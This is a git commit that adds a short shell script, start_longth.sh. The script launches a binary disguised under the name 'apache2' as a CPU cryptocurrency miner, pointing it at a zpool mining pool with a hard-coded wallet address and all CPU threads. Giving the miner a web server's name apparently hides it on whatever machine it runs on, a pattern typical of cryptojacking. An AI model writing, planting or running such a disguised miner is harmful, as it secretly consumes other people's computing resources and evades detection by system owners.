ca6bc4ddd6cc32bc009c55758d71d2c40a99968f
Long Hoang <152260528+longhoangth18@users.noreply.github.com>
2024-12-05 11:34:54 +0700

    Add files via upload

---
+++ start_longth.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+reset
+
+./apache2 --algorithm minotaurx --pool stratum+tcp://minotaurx.eu.mine.zpool.ca:7019 --wallet D5v82nxtaunmqc1S8qH1Xrvk47GwDnKpmb --password c=DGB --cpu-threads 0 --disable-gpu 
